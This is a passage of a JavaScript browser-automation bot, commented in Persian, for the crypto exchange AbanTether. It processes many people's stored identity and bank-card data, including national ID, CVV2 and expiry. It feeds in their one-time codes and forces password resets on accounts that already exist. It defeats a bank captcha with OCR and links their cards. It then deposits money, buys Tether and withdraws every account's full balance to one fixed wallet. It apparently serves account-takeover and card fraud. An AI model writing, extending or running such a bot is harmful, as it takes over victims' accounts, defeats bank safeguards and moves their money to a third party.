      .replace(/\d/g, (digit) => persianDigits[parseInt(digit)]);
  }

  async step1_Register() {
    console.log("\n📝 ======= مرحله 1: ثبت‌نام =======");
  
    try {
      await this.navigateTo(CONFIG.REGISTER_URL);
      
      // ======== اضافه کردن این بخش جدید ========
      console.log("🔍 چک کردن دکمه 'متوجه شدم'...");
      
      // منتظر بارگذاری صفحه باش
      await this.page.waitForTimeout(2000);
      
      // روش 1: کلیک با locator
      let clicked = await this.clickByTitle("متوجه شدم");
      
      // روش 2: اگر با title پیدا نشد، با text امتحان کن
      if (!clicked) {
        clicked = await this.clickByText("متوجه شدم");
      }
      
      // روش 3: اگر هنوز پیدا نشد، با evaluate امتحان کن
      if (!clicked) {
        clicked = await this.page.evaluate(() => {
          const elements = document.querySelectorAll('button, a, span, div');
          for (const element of elements) {
            const text = element.textContent || element.innerText || '';
            const title = element.getAttribute('title') || '';
            
            if (text.includes('متوجه شدم') || title.includes('متوجه شدم')) {
              element.click();
              return true;
            }
          }
          return false;
        });
        
        if (clicked) {
          console.log("✅ دکمه 'متوجه شدم' با evaluate کلیک شد");
          await this.page.waitForTimeout(1500);
        }
      }
      
      if (clicked) {
        console.log("✅ دکمه 'متوجه شدم' کلیک شد");
        await this.page.waitForTimeout(2000);
      } else {
        console.log("⚠️ دکمه 'متوجه شدم' پیدا نشد (ادامه می‌دهیم)");
      }
      // ======== پایان بخش جدید ========
      
      // ادامه مراحل قبلی...
      await this.fillByPlaceholder(
        "شماره موبایل خود را وارد کنید",
        this.currentUser.personalPhoneNumber
      );
  
      await this.clickByText("ثبت‌نام");
      await this.page.waitForTimeout(3000);
  
      const currentUrl = this.page.url();
  
      if (currentUrl.includes("/register")) {
        console.log("🔄 هنوز در صفحه ثبت‌نام هستیم، دوباره امتحان می‌کنیم...");
        await this.clickByText("ارسال کد");
        await this.clickByText("ادامه");
        await this.page.waitForTimeout(3000);
      }
  
      // کلیک نهایی "ثبت" در انتهای ثبت‌نام
      await this.page.click('button[title="ثبت"], button:has-text("ثبت")');
      console.log("کلیک روی ثبت نهایی...");
  
      try {
        // منتظر تغییر URL در حداکثر ۱۵ ثانیه (اگر تغییر کرد = موفق)
        await this.page.waitForURL((url) => !url.href.includes("/register"), {
          timeout: 15000,
        });
        console.log("✅ ثبت‌نام نهایی موفق – URL تغییر کرد");
        this.isResetFlow = false; // حالت عادی
      } catch (timeoutError) {
        // اگر در ۱۵ ثانیه URL تغییر نکرد = شکست → نیاز به ریست رمز
        console.log(
          "⚠️ ثبت‌نام نهایی شکست خورد (URL تغییر نکرد) – رفتن به مسیر ریست رمز"
        );
        this.isResetFlow = true;
        throw new Error("REGISTER_FAILED_NEED_RESET");
      }
  
      console.log("✅ مرحله 1 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 1:", error.message);
      throw error; // ارور رو پرتاب کن تا در processUser هندل بشه
    }
  }

  async step2_OtpAndPassword() {
    console.log("\n🔐 ======= مرحله 2: OTP و رمز عبور =======");
  
    try {
      if (this.isResetFlow) {
        // مسیر ریست رمز (اگر ثبت‌نام نهایی شکست خورد)
        const user = this.currentUser;
        const phoneNumber = user.personalPhoneNumber;
  
        console.log("شروع فرآیند فراموشی رمز عبور...");
  
        await this.page.goto("https://abantether.com/login");
        await this.page.waitForTimeout(4000);
  
        await this.page.click('button[title="فراموشی رمز عبور"]');
        await this.page.waitForTimeout(3000);
  
        await this.page.fill(
          'input[data-testid="username-input"][placeholder="شماره موبایل خود را وارد کنید"]',
          phoneNumber
        );
        await this.page.waitForTimeout(1000);
  
        await this.page.click('button[title="مرحله بعد"]');
        await this.page.waitForTimeout(5000);
  
        // منتظر otp_login (برای فراموشی رمز) - اولیه
        let loginOtp = null;
        const startTime = Date.now();
        while (Date.now() - startTime < CONFIG.WAIT_FOR_OTP) {
          loginOtp = await this.checkForOtp(phoneNumber, "login"); // otp اولیه
          if (loginOtp) break;
          await this.page.waitForTimeout(5000);
        }
  
        if (!loginOtp) throw new Error("OTP فراموشی رمز دریافت نشد");
  
        await this.page.fill(
          'input[name="otp"][placeholder="کد ارسال شده به شماره موبایل خود را وارد کنید"]',
          loginOtp
        );
        await this.page.waitForTimeout(1500);
  
        // تولید رمز جدید قوی
        const newPassword = this.generatePassword();
  
        await this.page.fill(
          'input[placeholder="رمز عبور جدید خود را وارد نمایید"]',
          newPassword
        );
        await this.page.fill(
          'input[placeholder="رمز عبور جدید خود را مجددا وارد نمایید"]',
          newPassword
        );
        await this.page.waitForTimeout(1000);
  
        await this.page.click('button[title="تایید"]');
        await this.page.waitForTimeout(5000);
  
        // لاگین با رمز جدید
        await this.page.fill(
          'input[data-testid="username-input"][placeholder="شماره موبایل خود را وارد کنید"]',
          phoneNumber
        );
        await this.page.fill(
          'input[data-testid="password-input"][placeholder="رمز عبور خود را وارد نمایید"]',
          newPassword
        );
        await this.page.waitForTimeout(1000);
  
        await this.page.click('button[title="ورود"]');
        await this.page.waitForTimeout(5000);
  
        // ========== تغییر این قسمت ==========
        // منتظر otp_login2 (OTP ورود بعد از ریست)
        let login2Otp = null;
        const startTime2 = Date.now();
        while (Date.now() - startTime2 < CONFIG.WAIT_FOR_OTP) {
          login2Otp = await this.checkForOtp(phoneNumber, "login2"); // تغییر به login2
          if (login2Otp) break;
          await this.page.waitForTimeout(5000);
        }
  
        if (!login2Otp) throw new Error("OTP ورود بعد از ریست دریافت نشد");
  
        await this.page.fill(
          'input[placeholder="کد ارسال شده به شماره موبایل خود را وارد کنید"]',
          login2Otp
        );
        await this.page.waitForTimeout(1500);
  
        await this.page.click('button[title="تایید"]');
        await this.page.waitForTimeout(5000);
  
        // ذخیره رمز جدید
        await this.updateUserStatus(phoneNumber, { password: newPassword });
        this.currentPassword = newPassword;
  
        console.log("✅ ریست رمز و لاگین موفق (اسکیپ پروفایل)");
      } else {
        // حالت عادی ثبت‌نام (OTP و رمز)
        const otpInput = await this.page.$(
          'input[placeholder*="کد ارسال شده"]'
        );
        if (otpInput) {
          const loginOtp = await this.waitForOtp("login");
          if (loginOtp) {
            await this.page.fill(
              'input[placeholder*="کد ارسال شده"]',
              loginOtp
            );
            await this.page.waitForTimeout(1000);
            (await this.clickByText("بعد")) ||
              (await this.clickByTitle("تایید"));
            await this.page.waitForTimeout(3000);
          }
        }
  
        const passwordInput = await this.page.$(
          'input[placeholder*="رمز عبور خود را وارد نمایید"]'
        );
        if (passwordInput) {
          await this.page.fill(
            'input[placeholder*="رمز عبور خود را وارد نمایید"]',
            this.currentPassword
          );
          await this.page.waitForTimeout(1000);
          (await this.clickByText("تایید")) ||
            (await this.clickByTitle("تایید"));
          await this.page.waitForTimeout(3000);
  
          await this.updateUserStatus(this.currentUser.personalPhoneNumber, {
            password: this.currentPassword,
          });
        }
      }
  
      console.log("✅ مرحله 2 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 2:", error.message);
      throw error;
    }
  }

  async step3_Profile() {
    console.log("\n👤 ======= مرحله 3: پروفایل =======");

    try {
      const nationalCode = this.currentUser.personalNationalCode;
      console.log(`🆔 وارد کردن کد ملی: ${nationalCode}`);
      await this.fillByPlaceholder(
        "کد ۱۰ رقمی شناسایی خود را وارد کنید",
        nationalCode
      );
      await this.page.waitForTimeout(1000);

      const birthDate = this.currentUser.personalBirthDate;
      console.log(`📅 تاریخ تولد: ${birthDate}`);

      const dateSuccess = await this.selectBirthDate(birthDate);

      if (!dateSuccess) {
        console.log("🔄 امتحان روش جایگزین...");

        const selectors = [
          'input[placeholder*="تاریخ"]',
          'input[placeholder*="تولد"]',
          'input[placeholder*="روز/ماه/سال"]',
        ];

        for (const selector of selectors) {
          const element = await this.page.$(selector);
          if (element) {
            await element.click();
            await this.page.waitForTimeout(500);
            await element.fill(birthDate);
            await this.page.waitForTimeout(500);
            await element.press("Tab");
            await this.page.waitForTimeout(500);
            console.log(`✅ تاریخ تولد با selector وارد شد`);
            break;
          }
        }
      }

      await this.page.waitForTimeout(1000);

      console.log("🖱️ کلیک روی دکمه ثبت...");
      let clicked =
        (await this.clickByTitle("ثبت")) ||
        (await this.clickByText("ثبت")) ||
        (await this.clickByText("تکمیل ثبت‌نام")) ||
        (await this.clickByText("ذخیره"));

      if (!clicked) {
        console.log("🔄 امتحان کلیک مستقیم روی دکمه...");
        clicked = await this.page.evaluate(() => {
          const buttons = document.querySelectorAll("button");
          for (const button of buttons) {
            if (
              button.textContent &&
              (button.textContent.includes("ثبت") ||
                button.textContent.includes("تکمیل") ||
                button.textContent.includes("ذخیره")) &&
              !button.disabled
            ) {
              button.click();
              return true;
            }
          }
          return false;
        });
      }

      await this.page.waitForTimeout(5000);

      console.log("🔍 چک کردن پیام‌های تأیید...");
      const confirmTexts = [
        "باشه",
        "تأیید",
        "ادامه",
        "متوجه شدم",
        "OK",
        "تایید",
      ];

      for (const text of confirmTexts) {
        try {
          const clicked = await this.clickByText(text);
          if (clicked) {
            console.log(`✅ کلیک روی "${text}"`);
            await this.page.waitForTimeout(1000);
          }
        } catch (e) {
          // continue
        }
      }

      console.log("✅ مرحله 3 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 3:", error.message);
      throw error;
    }
  }

  async step4_AddContract() {
    console.log("\n📄 ======= مرحله 4: افزودن قرارداد =======");

    try {
      console.log("🌐 رفتن به صفحه افزودن قرارداد...");
      await this.navigateTo(CONFIG.DEPOSIT_URL);
      await this.page.waitForTimeout(2000);

      console.log("🖱️ کلیک روی افزودن قرارداد...");
      let clicked = await this.clickByTitle("افزودن قرارداد");

      if (!clicked) {
        console.log("🔄 امتحان روش evaluate...");
        clicked = await this.page.evaluate(() => {
          const elements = document.querySelectorAll(
            '[title*="افزودن قرارداد"], button, a'
          );
          for (const element of elements) {
            if (
              element.textContent &&
              element.textContent.includes("افزودن قرارداد") &&
              !element.disabled
            ) {
              element.click();
              return true;
            }
          }
          return false;
        });
      }

      if (!clicked) {
        console.log("⚠️ نتوانست روی افزودن قرارداد کلیک کند، ادامه می‌دهیم...");
      }

      await this.page.waitForTimeout(2000);

      try {
        console.log("🏦 انتخاب بانک...");
        await this.page.click('div:has-text("نام بانک خود را انتخاب نمایید")');
        await this.page.waitForTimeout(1000);

        const bankName = this.getBankName(this.currentUser.cardNumber);
        console.log(`🏦 بانک تشخیص داده شده: ${bankName}`);

        await this.page.click(`p:has-text("${bankName}")`);
        await this.page.waitForTimeout(1000);

        console.log("📅 انتخاب مدت قرارداد...");
        await this.page.click('div:has-text("مدت قرارداد خود را انتخاب کنید")');
        await this.page.waitForTimeout(1000);
        await this.page.click('p:has-text("1 ماهه")');
        await this.page.waitForTimeout(1000);

        console.log("🖱️ کلیک روی ثبت و ادامه...");
        await this.clickByTitle("ثبت و ادامه");
      } catch (error) {
        console.log("⚠️ باکس انتخاب بانک باز نشد، ممکن است قبلاً پر شده باشد");
      }

      await this.page.waitForTimeout(3000);

      console.log("✅ مرحله 4 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 4:", error.message);
      throw error;
    }
  }

  async step5_BankProcess() {
    const user = this.currentUser;
    const bankName = this.getBankName(user.cardNumber);

    console.log(`🏦 شروع پردازش بانکی: ${bankName}`);

    if (bankName === "بانک ملی") {
      // کلیک روی ورود با کارت بانک ملی
      await this.page.click(
        'div.title.flex-grow-1:has-text("ورود با کارت بانک ملی")'
      );
      await this.page.waitForTimeout(4000);

      // وارد کردن شماره کارت
      const cleanCard = user.cardNumber.replace(/[\s-]/g, "");
      await this.page.fill("#card", cleanCard);
      await this.page.waitForTimeout(1000);

      // حل کپچا
      const captchaCode = await this.solveCaptchaWithTesseract();
      if (!captchaCode) {
        throw new Error("حل کپچا بانک ملی ناموفق");
      }

      await this.page.fill(
        '#captcha, input[name="captchaNumber"]',
        captchaCode
      );
      await this.page.waitForTimeout(1500);

      // ارسال رمز فعالسازی
      await this.page.click(
        'span:has-text("ارسال رمز فعالسازی"), button:has-text("ارسال رمز فعالسازی")'
      );
      await this.page.waitForTimeout(5000);

      // منتظر OTP کارت
      console.log("⏳ منتظر OTP کارت...");
      let cardOtp = null;
      const startTime = Date.now();
      while (Date.now() - startTime < CONFIG.WAIT_FOR_OTP) {
        cardOtp = await this.checkForOtp(user.personalPhoneNumber, "card"); // یا "otp_card" بسته به فیلد دیتابیست
        if (cardOtp) break;
        await this.page.waitForTimeout(5000);
      }

      if (!cardOtp) {
        throw new Error("OTP کارت دریافت نشد");
      }

      await this.page.fill(
        'input[autocomplete="one-time-code"], input[formcontrolname="otpCode"]',
        cardOtp
      );
      await this.page.waitForTimeout(1500);

      // کلیک ادامه
      await this.page.click('button.btn-continue.w-100.my-2:has-text("ادامه")');
      await this.page.waitForTimeout(6000);

      // ثبت قرارداد
      await this.page.click("text=ثبت قرارداد");
      await this.page.waitForTimeout(4000);

      console.log("✅ پردازش بانک ملی تکمیل شد");
      return true;
    }

    // اگر بانک دیگه بود (قبلی)
    // کد قدیمی‌ت رو اینجا بذار یا throw new Error("بانک پشتیبانی نمی‌شه");
    throw new Error(`بانک ${bankName} هنوز پیاده‌سازی نشده`);
  }

  async processBankMelli() {
    console.log("🏦 پردازش بانک ملی");

    console.log("🖱️ کلیک روی ورود با کارت بانک ملی");
    await this.clickByText("ورود با کارت بانک ملی");
    await this.page.waitForTimeout(3000);

    console.log("💳 وارد کردن شماره کارت");
    await this.fillByPlaceholder("شماره کارت", this.currentUser.cardNumber);

    console.log("⏸️ منتظر وارد کردن دستی کپچا... (15 ثانیه)");
    await this.page.waitForTimeout(15000);

    console.log("🖱️ کلیک روی ارسال رمز فعالسازی");
    await this.clickByText("ارسال رمز فعالسازی");

    console.log("⏳ منتظر OTP...");
    const cardOtp = await this.waitForOtp("register_card");
    if (cardOtp) {
      await this.enterOtp(cardOtp);
      await this.clickByText("ادامه");
    }
  }

  async processBankMellat() {
    console.log("🏦 پردازش بانک مهر ایران");

    console.log("💳 وارد کردن اطلاعات کارت");
    await this.fillByPlaceholder("شماره کارت", this.currentUser.cardNumber);
    await this.fillByPlaceholder("CVV2", this.currentUser.cvv2);
    await this.fillByPlaceholder(
      "ماه انقضا",
      this.currentUser.bankMonth.toString()
    );
    await this.fillByPlaceholder(
      "سال انقضا",
      this.currentUser.bankYear.toString()
    );

    console.log("⏸️ منتظر وارد کردن دستی کپچا... (15 ثانیه)");
    await this.page.waitForTimeout(15000);

    console.log("🖱️ کلیک روی دریافت رمز پویا");
    await this.clickByText("دریافت رمز پویا");

    console.log("⏳ منتظر OTP...");
    const cardOtp = await this.waitForOtp("register_card");
    if (cardOtp) {
      await this.fillByPlaceholder("رمز دوم", cardOtp);
      await this.clickByText("تایید");
    }
  }

  async step6_Deposit() {
    console.log("\n💵 ======= مرحله 6: واریز تومان =======");

    try {
      console.log("🏠 برگشت به صفحه اصلی...");
      await this.navigateTo(CONFIG.BASE_URL);
      await this.page.waitForTimeout(2000);

      console.log("💰 رفتن به کیف پول...");
      await this.clickByText("کیف پول");
      await this.page.waitForTimeout(3000);

      console.log("💵 وارد کردن مبلغ...");
      await this.fillByPlaceholder(
        "مبلغ واریز را به تومان وارد نمایید",
        CONFIG.DEPOSIT_AMOUNT
      );

      console.log("🏦 انتخاب بانک از لیست...");
      const bankList = await this.page.$("#bank-list");
      if (bankList) {
        await bankList.click();
        await this.page.waitForTimeout(1000);

        const bankName = this.getBankName(this.currentUser.cardNumber);
        await this.page.click(`p:has-text("${bankName}")`);
      }

      console.log("🖱️ کلیک روی واریز...");
      await this.clickByTitle("واریز");
      await this.page.waitForTimeout(2000);

      console.log("🖱️ کلیک روی تایید و پرداخت...");
      await this.clickByTitle("تایید و پرداخت");
      await this.page.waitForTimeout(3000);

      console.log("⏳ منتظر OTP پرداخت...");
      const paymentOtp = await this.waitForOtp("payment");
      if (paymentOtp) {
        await this.enterOtp(paymentOtp);
        await this.clickByText("تأیید");
      }

      await this.page.waitForTimeout(5000);

      console.log("✅ مرحله 6 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 6:", error.message);
      throw error;
    }
  }

  async step7_Buy() {
    console.log("\n🔄 ======= مرحله 7: خرید تتر =======");

    try {
      console.log("🌐 رفتن به صفحه خرید تتر...");
      await this.navigateTo(CONFIG.BUY_URL);
      await this.page.waitForTimeout(3000);

      console.log("🖱️ کلیک روی دکمه خرید...");
      await this.clickByText("خرید");
      await this.page.waitForTimeout(2000);

      console.log("💰 وارد کردن مبلغ...");
      await this.fillByPlaceholder("مبلغ", CONFIG.DEPOSIT_AMOUNT);

      console.log("🖱️ کلیک روی ثبت سفارش...");
      await this.clickByTitle("ثبت سفارش");
      await this.page.waitForTimeout(5000);

      console.log("✅ مرحله 7 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 7:", error.message);
      throw error;
    }
  }

  async step8_Withdraw() {
    console.log("\n📤 ======= مرحله 8: برداشت تتر =======");

    try {
      console.log("🌐 رفتن به صفحه برداشت...");
      await this.navigateTo(CONFIG.WITHDRAW_URL);
      await this.page.waitForTimeout(3000);

      console.log("🔍 جستجوی تتر...");
      await this.fillByPlaceholder("جستجو", "تتر");
      await this.page.waitForTimeout(2000);

      console.log("🖱️ کلیک روی تتر...");
      await this.page.click('p:has-text("تتر")');
      await this.page.waitForTimeout(2000);

      console.log("📫 وارد کردن آدرس ولت...");
      await this.fillByPlaceholder(
        "آدرس ولت مقصد خود را وارد کنید",
        CONFIG.WITHDRAW_ADDRESS
      );

      console.log("🖱️ کلیک روی برداشت کل موجودی...");
      await this.clickByTitle("برداشت کل موجودی");
      await this.page.waitForTimeout(2000);

      console.log("🖱️ کلیک روی ثبت برداشت...");
      await this.clickByTitle("ثبت برداشت");
      await this.page.waitForTimeout(5000);

      console.log("✅ مرحله 8 تکمیل شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در مرحله 8:", error.message);
      throw error;
    }
  }

  getBankName(cardNumber) {
    if (!cardNumber || typeof cardNumber !== "string") {
      return "بانک ملی";
    }

    if (cardNumber.startsWith("603799")) return "بانک ملی";
    if (cardNumber.startsWith("610433") || cardNumber.startsWith("504172"))
      return "بانک مهر ایران";
    if (cardNumber.startsWith("603770") || cardNumber.startsWith("639217"))
      return "بانک کشاورزی";
    if (cardNumber.startsWith("585983") || cardNumber.startsWith("627353"))
      return "بانک تجارت";

    return "بانک ملی";
  }

  async solveCaptchaWithTesseract() {
    console.log("🔍 در حال حل کپچا با Tesseract OCR (آفلاین)...");

    const worker = await createWorker({
      logger: (m) => console.log(m.status), // لاگ پیشرفت (اختیاری)
      cacheMethod: "none",
    });

    await worker.load();
    await worker.loadLanguage("eng"); // 'eng' برای اعداد بانکی بهتره
    await worker.initialize("eng");

    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const captchaImg = await this.page.$("img.border-start.h-100");
        if (!captchaImg) {
          console.log("❌ تصویر کپچا پیدا نشد");
          await this.page.waitForTimeout(2000);
          continue;
        }

        const screenshotBuffer = await captchaImg.screenshot();

        const {
          data: { text },
        } = await worker.recognize(screenshotBuffer);

        let captchaCode = text.trim().replace(/\D/g, "");

        console.log(
          `تلاش ${attempt} - متن خام: "${text}" → کد: "${captchaCode}"`
        );

        if (captchaCode.length === 4) {
          console.log(`✅ کپچا حل شد: ${captchaCode}`);
          await worker.terminate();
          return captchaCode;
        }

        console.log(`⚠️ کد اشتباه، رفرش کپچا...`);
        const refreshBtn = await this.page.$(
          "#card-captcha-refresh-btn i, a i.fa-sync-alt"
        );
        if (refreshBtn) {
          await refreshBtn.click();
          await this.page.waitForTimeout(2500);
        }
      } catch (error) {
        console.error(`❌ خطا در Tesseract (تلاش ${attempt}):`, error.message);
      }
    }

    await worker.terminate();
    console.log("❌ حل کپچا ناموفق");
    return null;
  }

  async processUser(user) {
    const phoneNumber = user.personalPhoneNumber;
    this.currentUser = user;

    let currentStep = "شروع";
    let retryCount = user.retryCount || 0;

    try {
      console.log("\n" + "=".repeat(50));
      console.log(`🚀 شروع پردازش کاربر: ${user.personalName}`);
      console.log(`📱 شماره: ${phoneNumber}`);
      console.log(`🏦 بانک: ${this.getBankName(user.cardNumber)}`);
      console.log(`🔄 تلاش: ${retryCount + 1}/${CONFIG.MAX_RETRIES}`);
      console.log("=".repeat(50));

      if (retryCount >= CONFIG.MAX_RETRIES) {
        console.log(`⛔ کاربر به حداکثر تلاش‌ها رسیده است`);
        await this.updateUserStatus(phoneNumber, {
          status: "failed",
        });
        return false;
      }

      await this.updateUserStatus(phoneNumber, {
        status: "processing",
      });

      if (!(await this.initializeBrowser())) {
        throw new Error("راه‌اندازی مرورگر ناموفق بود");
      }

      const steps = [
        {
          name: "ثبت‌نام",
          method: () => this.step1_Register(),
          retryable: true,
        },
        {
          name: "OTP و رمز عبور",
          method: () => this.step2_OtpAndPassword(),
          retryable: true,
        },
        // پروفایل فقط اگر حالت عادی بود اجرا بشه
        ...(this.isResetFlow
          ? []
          : [
              {
                name: "پروفایل",
                method: () => this.step3_Profile(),
                retryable: true,
              },
            ]),
        {
          name: "افزودن قرارداد",
          method: () => this.step4_AddContract(),
          retryable: true,
        },
        {
          name: "پردازش بانکی",
          method: () => this.step5_BankProcess(),
          retryable: true,
        },
        {
          name: "واریز تومان",
          method: () => this.step6_Deposit(),
          retryable: true,
        },
        { name: "خرید تتر", method: () => this.step7_Buy(), retryable: true },
        {
          name: "برداشت تتر",
          method: () => this.step8_Withdraw(),
          retryable: true,
        },
      ];

      for (let i = 0; i < steps.length; i++) {
        const step = steps[i];
        currentStep = step.name;

        console.log(`\n📋 مرحله ${i + 1}/${steps.length}: ${step.name}`);

        try {
          await step.method();

          if (i < steps.length - 1) {
            const delay = Math.random() * 2000 + 1000;
            console.log(`⏳ تأخیر ${Math.round(delay / 1000)} ثانیه...`);
            await this.page.waitForTimeout(delay);
          }
        } catch (stepError) {
          console.error(`❌ خطا در "${step.name}":`, stepError.message);

          if (step.retryable && retryCount < CONFIG.MAX_RETRIES - 1) {
            console.log(`🔄 تلاش مجدد...`);

            await this.closeBrowser();
            await this.page.waitForTimeout(CONFIG.RETRY_DELAY);

            this.currentPassword = this.generatePassword();

            if (!(await this.initializeBrowser())) {
              throw new Error("خطا در راه‌اندازی مجدد مرورگر");
            }

            i--;
            retryCount++;
            continue;
          } else {
            throw stepError;
          }
        }
      }

      await this.updateUserStatus(phoneNumber, {
        processed: true,
        status: "completed",
        password: this.currentPassword,
      });

      console.log(`\n🎉 پردازش کاربر ${phoneNumber} با موفقیت تکمیل شد!`);
      console.log(`🔐 رمز عبور استفاده شده: ${this.currentPassword}`);
      return true;
    } catch (error) {
      console.error(`\n💥 خطا برای کاربر ${phoneNumber}:`, error.message);
      await this.updateUserStatus(phoneNumber, {
        status: "failed",
      });
      return false;
    } finally {
      await this.closeBrowser();
      this.activeProcesses.delete(phoneNumber);
      this.currentUser = null;
      this.currentPassword = this.generatePassword();
    }
  }

  async startService() {
    console.log("\n🚀 سرویس ربات آبان تتر شروع شد");
    console.log("\n🔧 تنظیمات:");
    console.log(`   📍 URL سایت: ${CONFIG.BASE_URL}`);
    console.log(
      `   💰 مبلغ واریز: ${CONFIG.DEPOSIT_AMOUNT.toLocaleString()} تومان`
    );
    console.log(
      `   📫 آدرس برداشت: ${CONFIG.WITHDRAW_ADDRESS.substring(0, 20)}...`
    );
    console.log(`   🔄 حداکثر تلاش: ${CONFIG.MAX_RETRIES} بار`);
    console.log(
      `   ⏱️ فاصله چک دیتابیس: ${CONFIG.POLLING_INTERVAL / 1000} ثانیه`
    );
    console.log(
      `   🖥️ حالت مرورگر: ${CONFIG.HEADLESS ? "پنهان" : "قابل مشاهده"}`
    );

    if (!(await this.connectToDatabase())) {
      console.error("❌ خاتمه به دلیل خطای دیتابیس");
      return;
    }

    this.startPolling();

    process.on("SIGINT", async () => {
      console.log("\n🛑 دریافت سیگنال خاتمه...");
      await this.stopService();
      process.exit(0);
    });

    console.log("\n✅ سرویس با موفقیت راه‌اندازی شد");
    console.log("⏳ در انتظار کاربران جدید...");
  }

  async startPolling() {
    const poll = async () => {
      if (this.isProcessing) {
        console.log("⏸️ در حال پردازش کاربران دیگر...");
        return;
      }

      this.isProcessing = true;

      try {
        const pendingUsers = await this.getPendingUsers();

        for (const user of pendingUsers) {
          const phoneNumber = user.personalPhoneNumber;

          if (this.activeProcesses.has(phoneNumber)) {
            console.log(`⏭️ کاربر ${phoneNumber} در حال پردازش است`);
            continue;
          }

          this.activeProcesses.set(phoneNumber, true);

          this.processUser(user).finally(() => {
            this.activeProcesses.delete(phoneNumber);
          });
        }
      } catch (error) {
        console.error("❌ خطا در پولینگ:", error.message);
      } finally {
        this.isProcessing = false;
      }
    };

    await poll();

    setInterval(poll, CONFIG.POLLING_INTERVAL);

    console.log(
      `✅ پولینگ فعال شد (هر ${CONFIG.POLLING_INTERVAL / 1000} ثانیه)`
    );
  }


  async stopService() {
    console.log("\n🛑 در حال توقف سرویس...");
    await this.closeBrowser();
  
    console.log("✅ سرویس متوقف شد");
  }
}

// ==================== اجرای برنامه ====================
if (require.main === module) {
  process.on("uncaughtException", (error) => {
    console.error("🔥 خطای غیرمنتظره:", error);
  });

  process.on("unhandledRejection", (reason, promise) => {
    console.error("🔥 Promise رد شده:", reason);
  });

  console.log("\n🤖 ربات آبان تتر - نسخه اصلاح شده");
  console.log(`🖥️ حالت: ${CONFIG.HEADLESS ? "Headless" : "با نمایش مرورگر"}`);

  const bot = new AbanTetherBot();

  bot.startService().catch((error) => {
    console.error("❌ خطای شروع سرویس:", error);
    process.exit(1);
  });
}

module.exports = AbanTetherBot;